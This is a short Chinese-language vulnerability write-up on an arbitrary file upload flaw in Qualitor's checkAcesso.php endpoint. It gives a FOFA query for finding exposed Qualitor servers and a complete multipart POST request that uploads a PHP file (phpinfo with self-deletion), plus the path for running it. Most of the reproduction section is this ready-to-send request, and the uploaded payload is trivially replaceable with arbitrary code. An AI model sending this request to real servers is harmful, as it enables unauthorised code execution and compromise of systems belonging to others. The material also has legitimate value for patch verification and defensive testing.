# Qualitor checkAcesso.php存在任意文件上传漏洞

# 一、漏洞简介
Qualitor checkAcesso.php存在任意文件上传漏洞

# 二、影响版本
+ Qualitor 

# 三、资产测绘
+ fofa`app="Qualitor-Web"`
+ 特征

![1727509167970-d543fa15-b1c4-40b9-91b1-f7e9d6b79657.png](./img/YpPPegF7LDDl-noY/1727509167970-d543fa15-b1c4-40b9-91b1-f7e9d6b79657-467073.png)

# 四、漏洞复现
```java
POST /html/ad/adfilestorage/request/checkAcesso.php HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=---------------------------QUALITORspaceCVEspace2024space44849
 
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="idtipo"
 
2
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="nmfilestorage"
 
 
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="nmdiretoriorede"
 
.
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="nmbucket"
 
 
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="nmaccesskey"
 
 
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="nmkeyid"
 
 
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="fleArquivo"; filename="info.php"
 
<?php phpinfo();unlink(__FILE__);?>
-----------------------------QUALITORspaceCVEspace2024space44849
Content-Disposition: form-data; name="cdfilestorage"
 
 
-----------------------------QUALITORspaceCVEspace2024space44849--
```

![1728639897143-e9d01fec-9808-4387-9707-69da629ae5b7.png](./img/YpPPegF7LDDl-noY/1728639897143-e9d01fec-9808-4387-9707-69da629ae5b7-159864.png)

```java
/html/ad/adfilestorage/request/info.php
```

![1728639914962-87b75123-79a6-425c-867d-eb3debfa671b.png](./img/YpPPegF7LDDl-noY/1728639914962-87b75123-79a6-425c-867d-eb3debfa671b-108101.png)



> 更新: 2024-10-22 09:36:08  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yiooigqwix8pxlaz>